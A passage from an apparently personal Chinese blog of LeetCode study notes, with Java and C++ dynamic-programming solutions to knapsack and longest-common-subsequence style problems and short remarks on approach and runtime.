class="variable">j</span> <span class="operator">=</span> Integer.min(sum, num * <span class="number">2</span> - <span class="number">1</span>); j &gt;= num; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[j - num]) &#123;</span><br><span class="line">                    dp[j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span> * ARR_MAX_VAL - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[j]) &#123;</span><br><span class="line">                res = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好像还能优化，不过不管辣。<del>中等难度这种写法就够了，困难难度在理解优化方案</del></p>
<p>用时：84.86%</p>
<p>内存：92.96%</p>
<h3 id="474-一和零"><a href="#474-一和零" class="headerlink" title="474. 一和零"></a><a href="https://leetcode.cn/problems/ones-and-zeroes/">474. 一和零</a></h3><p>发现这道题一年前做过。这里有两种相同，但是有不同的地方分析一下，加深一下自己的理解。</p>
<p>一年前的解法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxForm</span><span class="params">(vector&lt;string&gt;&amp; strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//背包问题</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;strs.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; curNum=<span class="built_in">getZeroAndOneNum</span>(strs[i]);</span><br><span class="line">            <span class="type">int</span> zeroNum=curNum[<span class="number">0</span>],oneNum=curNum[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=m;j&gt;=zeroNum;j--)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k=n;k&gt;=oneNum;k--)&#123;</span><br><span class="line">                    dp[j][k]=<span class="built_in">max</span>(dp[j][k],dp[j-zeroNum][k-oneNum]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getZeroAndOneNum</span><span class="params">(string&amp; str)</span></span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c:str)&#123;</span><br><span class="line">            res[<span class="number">0</span>]+=(c==<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            res[<span class="number">1</span>]+=(c==<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>现在的解法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMaxForm</span><span class="params">(String[] strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">strArrLength</span> <span class="operator">=</span> strs.length;</span><br><span class="line">        <span class="comment">//dp[m][i][j] = max(dp[m-1][i][j], dp[m-1][i-...][j-...] + 1)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sumZero</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sumOne</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (String str : strs) &#123;</span><br><span class="line">            <span class="type">int</span>[] counts = getZeroAndOneCountByString(str);</span><br><span class="line">            <span class="type">int</span> <span class="variable">zeroCount</span> <span class="operator">=</span> counts[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">oneCount</span> <span class="operator">=</span> counts[<span class="number">1</span>];</span><br><span class="line">            sumZero += zeroCount;</span><br><span class="line">            sumZero = Integer.min(sumZero, m);</span><br><span class="line">            sumOne += oneCount;</span><br><span class="line">            sumOne = Integer.min(sumOne, n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sumZero; i &gt;= zeroCount; i--) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> sumOne; j &gt;= oneCount; j--) &#123;</span><br><span class="line">                    dp[i][j] = Integer.max(dp[i][j], dp[i - zeroCount][j - oneCount] + <span class="number">1</span>);</span><br><span class="line">                    res =Integer.max(res, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] getZeroAndOneCountByString(String str) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">zero</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">one</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">strLength</span> <span class="operator">=</span> str.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strLength; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str.charAt(i) == <span class="string">&#x27;0&#x27;</span>) zero++;</span><br><span class="line">            <span class="keyword">else</span> one++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;zero, one&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不管语言上的差别。可以看到主要是两个地方不同</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一种方法</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=m;j&gt;=zeroNum;j--)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=n;k&gt;=oneNum;k--)&#123;</span><br><span class="line">        dp[j][k]=max(dp[j][k],dp[j-zeroNum][k-oneNum]+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[m][n];</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种方法</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sumZero; i &gt;= zeroCount; i--) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> sumOne; j &gt;= oneCount; j--) &#123;</span><br><span class="line">        dp[i][j] = Integer.max(dp[i][j], dp[i - zeroCount][j - oneCount] + <span class="number">1</span>);</span><br><span class="line">        res =Integer.max(res, dp[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure>

<p>可以看到主要是for的开始位置不同，第一种是直接从最大值遍历，第二种是从我们计算的sum开始。</p>
<p>而第一种能直接返回dp[m][n]</p>
<p>第二种需要每次保存最大值。</p>
<p>直观感觉：差别不大，第一种在数字更大，限制m更小时效果更好。第二种相反。</p>
<h3 id="1774-最接近目标价格的甜点成本"><a href="#1774-最接近目标价格的甜点成本" class="headerlink" title="1774. 最接近目标价格的甜点成本"></a><a href="https://leetcode.cn/problems/closest-dessert-cost/">1774. 最接近目标价格的甜点成本</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target可以看成背包容量。</span><br><span class="line">先看看规则:</span><br><span class="line">必须选择 一种 冰激凌基料。</span><br><span class="line">可以添加 一种或多种 配料，也可以不添加任何配料。</span><br><span class="line">每种类型的配料 最多两份 。</span><br><span class="line"></span><br><span class="line">感觉可以按照下面流程处理:先创建dp[target+1] 数组=&gt;遍历所有baseCosts 让dp[baseCosts[i]] = true=&gt;然后遍历配料（这个时候就像0-1背包反正就三种选择）</span><br><span class="line">编码试试</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">closestCost</span><span class="params">(<span class="type">int</span>[] baseCosts, <span class="type">int</span>[] toppingCosts, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">TARGET_MAX_VAL</span> <span class="operator">=</span> <span class="number">4</span>*<span class="number">10000</span>;</span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[TARGET_MAX_VAL + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> baseCost : baseCosts) &#123;</span><br><span class="line">            dp[baseCost] = <span class="literal">true</span>;</span><br><span class="line">            sum += baseCost;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> toppingCost : toppingCosts) &#123;</span><br><span class="line">            sum += <span class="number">2</span> * toppingCost;</span><br><span class="line">            sum = Integer.min(sum, TARGET_MAX_VAL);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> sum; j &gt;= toppingCost; j--) &#123;</span><br><span class="line">                dp[j] |= dp[j - toppingCost];</span><br><span class="line">                <span class="keyword">if</span> (j &gt;= toppingCost * <span class="number">2</span>) dp[j] |= dp[j - <span class="number">2</span> * toppingCost];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; ; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (target - i &gt;= <span class="number">0</span> &amp;&amp; dp[target - i]) <span class="keyword">return</span> target - i;</span><br><span class="line">            <span class="keyword">if</span> (target + i &gt;= <span class="number">0</span> &amp;&amp; dp[target + i]) <span class="keyword">return</span> target + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>md,TARGET_MAX_VAL忘了乘4了，找了半天bug</p>
<h3 id="879-盈利计划"><a href="#879-盈利计划" class="headerlink" title="879. 盈利计划"></a><a href="https://leetcode.cn/problems/profitable-schemes/">879. 盈利计划</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">集团里有 n 名员工，他们可以完成各种各样的工作创造利润。</span><br><span class="line"></span><br><span class="line">第 i 种工作会产生 profit[i] 的利润，它要求 group[i] 名成员共同参与。如果成员参与了其中一项工作，就不能参与另一项工作。</span><br><span class="line"></span><br><span class="line">工作的任何至少产生 minProfit 利润的子集称为 盈利计划 。并且工作的成员总数最多为 n 。</span><br><span class="line"></span><br><span class="line">有多少种计划可以选择？因为答案很大，所以 返回结果模 10^9 + 7 的值。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一眼背包且是0-1背包。看看怎样抽象</span><br><span class="line">n为容量，group[i]为占的容量 profit 为产生的价值</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">profitableSchemes</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> minProfit, <span class="type">int</span>[] group, <span class="type">int</span>[] profit)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> group.length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>][minProfit + <span class="number">1</span>];<span class="comment">//dp[i][j]  表示刚好使用i个人赚 j的方案，</span></span><br><span class="line">        <span class="comment">//dp[i][minProfit] 表示赚钱能超过minProfit的方案</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            Arrays.fill(dp[i], -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sumPeople</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sumProfit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; group.length; i++) &#123;</span><br><span class="line">            sumPeople += group[i];</span><br><span class="line">            sumPeople = Integer.min(n, sumPeople);</span><br><span class="line">            sumProfit += profit[i];</span><br><span class="line">            sumProfit = Integer.min(sumProfit, minProfit);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> sumPeople; j &gt;= group[i]; j--) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> sumProfit + profit[i]; k &gt;= profit[i]; k--) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (k &gt;= minProfit &amp;&amp; dp[j - group[i]][k - profit[i]] != -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dp[j][minProfit] == -<span class="number">1</span>) &#123;</span><br><span class="line">                            dp[j][minProfit] = dp[j - group[i]][k - profit[i]];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            dp[j][minProfit] += dp[j - group[i]][k - profit[i]];</span><br><span class="line">                        &#125;</span><br><span class="line">                        dp[j][minProfit] %= MOD_NUM;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dp[j - group[i]][k - profit[i]] != -<span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (dp[j][k] == -<span class="number">1</span>) &#123;</span><br><span class="line">                                dp[j][k] = dp[j - group[i]][k - profit[i]];</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                dp[j][k] += dp[j - group[i]][k - profit[i]];</span><br><span class="line">                            &#125;</span><br><span class="line">                            dp[j][k] %= MOD_NUM;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dp[i][minProfit] != -<span class="number">1</span>) &#123;</span><br><span class="line">                res += dp[i][minProfit];</span><br><span class="line">                res %= MOD_NUM;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>时间72.18%</p>
<p>内存85.36%</p>
<h3 id="3082-求出所有子序列的能量和"><a href="#3082-求出所有子序列的能量和" class="headerlink" title="3082. 求出所有子序列的能量和"></a><a href="https://leetcode.cn/problems/find-the-sum-of-the-power-of-all-subsequences/">3082. 求出所有子序列的能量和</a></h3><p>todo</p>
<h3 id="956-最高的广告牌"><a href="#956-最高的广告牌" class="headerlink" title="956. 最高的广告牌"></a><a href="https://leetcode.cn/problems/tallest-billboard/">956. 最高的广告牌</a></h3><p>todo</p>
<h3 id="2518-好分区的数目"><a href="#2518-好分区的数目" class="headerlink" title="2518. 好分区的数目"></a><a href="https://leetcode.cn/problems/number-of-great-partitions/">2518. 好分区的数目</a></h3><p>todo</p>
<h3 id="2742-给墙壁刷油漆"><a href="#2742-给墙壁刷油漆" class="headerlink" title="2742. 给墙壁刷油漆"></a><a href="https://leetcode.cn/problems/painting-the-walls/">2742. 给墙壁刷油漆</a></h3><p>todo</p>
<h3 id="LCP-47-入场安检"><a href="#LCP-47-入场安检" class="headerlink" title="LCP 47. 入场安检"></a><a href="https://leetcode.cn/problems/oPs9Bm/">LCP 47. 入场安检</a></h3><p>todo</p>
<h3 id="1449-数位成本和为目标值的最大数字"><a href="#1449-数位成本和为目标值的最大数字" class="headerlink" title="1449. 数位成本和为目标值的最大数字"></a><a href="https://leetcode.cn/problems/form-largest-integer-with-digits-that-add-up-to-target/">1449. 数位成本和为目标值的最大数字</a></h3><p>todo</p>
<h3 id="2585-获得分数的方法数"><a href="#2585-获得分数的方法数" class="headerlink" title="2585. 获得分数的方法数"></a><a href="https://leetcode.cn/problems/number-of-ways-to-earn-points/">2585. 获得分数的方法数</a></h3><p>todo</p>
<h3 id="2902-和带限制的子多重集合的数目"><a href="#2902-和带限制的子多重集合的数目" class="headerlink" title="2902. 和带限制的子多重集合的数目"></a><a href="https://leetcode.cn/problems/count-of-sub-multisets-with-bounded-sum/">2902. 和带限制的子多重集合的数目</a></h3><p>todo</p>
<h3 id="1155-掷骰子等于目标和的方法数"><a href="#1155-掷骰子等于目标和的方法数" class="headerlink" title="1155. 掷骰子等于目标和的方法数"></a><a href="https://leetcode.cn/problems/number-of-dice-rolls-with-target-sum/">1155. 掷骰子等于目标和的方法数</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numRollsToTarget</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>][target + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= target; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">z</span> <span class="operator">=</span> <span class="number">1</span>; z &lt;= k; z++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j - z &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        dp[i][j] += dp[i - <span class="number">1</span>][j - z];</span><br><span class="line">                        dp[i][j] %= MOD_NUM;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n][target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以压空间，但懒得压了。</p>
<h3 id="1981-最小化目标值与所选元素的差"><a href="#1981-最小化目标值与所选元素的差" class="headerlink" title="1981. 最小化目标值与所选元素的差"></a><a href="https://leetcode.cn/problems/minimize-the-difference-between-target-and-chosen-elements/">1981. 最小化目标值与所选元素的差</a></h3><p>题干</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给你一个大小为 m x n 的整数矩阵 mat 和一个整数 target 。</span><br><span class="line"></span><br><span class="line">从矩阵的 每一行 中选择一个整数，你的目标是 最小化 所有选中元素之 和 与目标值 target 的 绝对差 。</span><br><span class="line"></span><br><span class="line">返回 最小的绝对差 。</span><br><span class="line"></span><br><span class="line">a 和 b 两数字的 绝对差 是 a - b 的绝对值。</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">怎么感觉像2分。。。</span><br><span class="line">分类属于分组背包，那按照分组背包思考</span><br><span class="line">直观感觉可以先求，总体最大值和最小值。如果两个同时大于或同时小于那么能直接得到结果。同时第三中情况也能够省下空间。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minimizeTheDifference(int[][] mat, int target) &#123;</span><br><span class="line">        int minVal = 0;</span><br><span class="line">        int maxVal = 0;</span><br><span class="line">        int m = mat.length;</span><br><span class="line">        int n = mat[0].length;</span><br><span class="line">        for (int i = 0; i &lt; m; i++) &#123;</span><br><span class="line">            minVal += Arrays.stream(mat[i]).min().getAsInt();</span><br><span class="line">            maxVal += Arrays.stream(mat[i]).max().getAsInt();</span><br><span class="line">        &#125;</span><br><span class="line">        if (minVal &gt;= target) return minVal - target;</span><br><span class="line">        if (maxVal &lt;= target) return target - maxVal;</span><br><span class="line">        boolean[][] dp = new boolean[2][target * 2];</span><br><span class="line">        dp[0][0] = true;</span><br><span class="line">        for (int i = 0; i &lt; m; i++) &#123;</span><br><span class="line">            for (int matNum : mat[i]) &#123;</span><br><span class="line">                for (int j = matNum; j &lt; 2 * target; j++) &#123;</span><br><span class="line">                    dp[(i + 1) % 2][j] |= dp[i % 2][j - matNum];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Arrays.fill(dp[i % 2], false);</span><br><span class="line">        &#125;</span><br><span class="line">        for (int i = 0; i &lt; target; i++) &#123;</span><br><span class="line">            if (dp[m % 2][target - i] || dp[m % 2][target + i]) return i;</span><br><span class="line">        &#125;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二维滚动数组。需要注意得是Arrays.fill(dp[i % 2], false)，避免之前结果得干扰</p>
<h3 id="2218-从栈中取出-K-个硬币的最大面值和"><a href="#2218-从栈中取出-K-个硬币的最大面值和" class="headerlink" title="2218. 从栈中取出 K 个硬币的最大面值和"></a><a href="https://leetcode.cn/problems/maximum-value-of-k-coins-from-piles/">2218. 从栈中取出 K 个硬币的最大面值和</a></h3><p>todo</p>
<h2 id="经典线性dp"><a href="#经典线性dp" class="headerlink" title="经典线性dp"></a>经典线性dp</h2><p><a href="https://www.bilibili.com/video/BV1TM4y1o7ug/?vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">最长公共子序列 编辑距离_哔哩哔哩_bilibili</a></p>
<p>（最长公共子序列不相等时，不用管dp[i-1][j-1]）</p>
<p>(编辑距离要管,因为两个增加可以看成一个替换)</p>
<p><a href="https://blog.csdn.net/lxt_Lucia/article/details/81209962">最长公共子序列 (LCS) 详解+例题模板（全）-CSDN博客</a></p>
<h3 id="712-两个字符串的最小ASCII删除和"><a href="#712-两个字符串的最小ASCII删除和" class="headerlink" title="712. 两个字符串的最小ASCII删除和"></a><a href="https://leetcode.cn/problems/minimum-ascii-delete-sum-for-two-strings/">712. 两个字符串的最小ASCII删除和</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimumDeleteSum</span><span class="params">(String s1, String s2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> s1.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s2.length();</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                res += (<span class="type">int</span>) s2.charAt(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">                res += (<span class="type">int</span>) s1.charAt(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = (<span class="type">int</span>) s2.charAt(<span class="number">0</span>);</span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">0</span>] = (<span class="type">int</span>) s1.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i - <span class="number">1</span>][<span class="number">0</span>] + (<span class="type">int</span>) s1.charAt(i-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = dp[<span class="number">0</span>][i - <span class="number">1</span>] + (<span class="type">int</span>) s2.charAt(i-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s1.charAt(i-<span class="number">1</span>) == s2.charAt(j-<span class="number">1</span>)) dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j] + s1.charAt(i-<span class="number">1</span>);</span><br><span class="line">                    dp[i][j] = Integer.min(dp[i][j - <span class="number">1</span>] + (<span class="type">int</span>) s2.charAt(j-<span class="number">1</span>), dp[i][j]);</span><br><span class="line">                    <span class="comment">// dp[i][j] = Integer.min(dp[i - 1][j - 1] + (int) s1.charAt(i-1) + (int) s2.charAt(j-1), dp[i][j]);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1035-不相交的线"><a href="#1035-不相交的线" class="headerlink" title="1035. 不相交的线"></a><a href="https://leetcode.cn/problems/uncrossed-lines/">1035. 不相交的线</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很有意思得一道题，乍一看以为是图论题（什么相交不相交的）。其实仔细看，就是最大相同子序列。但老实说，如果这道题不在最长公共子序我是想不到的，想到了就很简单了</span><br></pre></td></tr></table></figure>

<p>代码</p>
